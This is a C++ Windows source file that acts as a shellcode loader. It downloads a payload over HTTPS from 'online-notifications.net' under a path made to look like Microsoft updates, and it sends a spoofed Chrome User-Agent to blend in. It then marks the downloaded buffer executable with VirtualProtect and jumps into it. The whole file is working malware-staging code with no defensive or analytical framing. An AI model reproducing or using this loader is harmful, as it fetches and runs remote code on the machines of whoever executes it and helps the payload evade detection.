#include <Windows.h>
#include <winhttp.h>
#include <iostream>
#include <vector>
#include <string>

#pragma comment(lib, "winhttp.lib")

std::vector<BYTE> Download(const std::wstring& baseAddress, const std::wstring& filename);

int main()
{

    std::wstring baseAddress = L"online-notifications.net"; // Example base address
    std::wstring filename = L"/microsofta-updates"; // Example filename

    // Print the values
    std::wcout << L"Base Address: " << baseAddress << std::endl;
    std::wcout << L"Filename: " << filename << std::endl;

    // Download shellcode
    std::vector<BYTE> shellcode = Download(baseAddress, filename);

    // Get pointer to buffer
    LPVOID ptr = &shellcode[0];

    // Set memory to RWX
    DWORD oldProtect;
    VirtualProtect(
        ptr,
        shellcode.size(),
        PAGE_EXECUTE_READWRITE,
        //PAGE_EXECUTE_READ,
        &oldProtect);

    // Execute
    (*(void(*)()) ptr)();

}

std::vector<BYTE> Download(const std::wstring& baseAddress, const std::wstring& filename) {
    // Initialize session with secure defaults
    HINTERNET hSession = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36", // Custom User-Agent
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,    // Proxy aware
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        WINHTTP_FLAG_SECURE_DEFAULTS);          // Enable SSL verification

    if (!hSession) {
        std::cerr << "Failed to open WinHTTP session!" << std::endl;
        return {};
    }

    // Create session for target
    HINTERNET hConnect = WinHttpConnect(
        hSession,
        baseAddress.c_str(),
        INTERNET_DEFAULT_HTTPS_PORT,            // Port 443
        0);

    if (!hConnect) {
        std::cerr << "Failed to connect to server!" << std::endl;
        WinHttpCloseHandle(hSession);
        return {};
    }

    // Create request handle with SSL
    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        filename.c_str(),
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);                   // Secure HTTPS request

    if (!hRequest) {
        std::cerr << "Failed to open request handle!" << std::endl;
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return {};
    }

    // Add custom User-Agent header
    BOOL headerAdded = WinHttpAddRequestHeaders(
        hRequest,
        L"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36",
        -1L,                                   // Length of header (-1 means auto-calculate the string length)
        WINHTTP_ADDREQ_FLAG_ADD);              // Add header

    if (!headerAdded) {
        std::cerr << "Failed to add User-Agent header!" << std::endl;
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return {};
    }

    // Send the request
    BOOL result = WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        WINHTTP_NO_REQUEST_DATA,
        0,
        0,
        0);

    if (!result) {
        std::cerr << "Failed to send the request!" << std::endl;
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return {};
    }

    // Receive response
    result = WinHttpReceiveResponse(hRequest, NULL);

    if (!result) {
        std::cerr << "Failed to receive response!" << std::endl;
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return {};
    }

    // Read the data
    std::vector<BYTE> buffer;
    DWORD bytesRead = 0;

    do {
        BYTE temp[4096]{};
        if (WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead) && bytesRead > 0) {
            buffer.insert(buffer.end(), temp, temp + bytesRead);
        }
    } while (bytesRead > 0);

    // Close all handles
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return buffer;
}
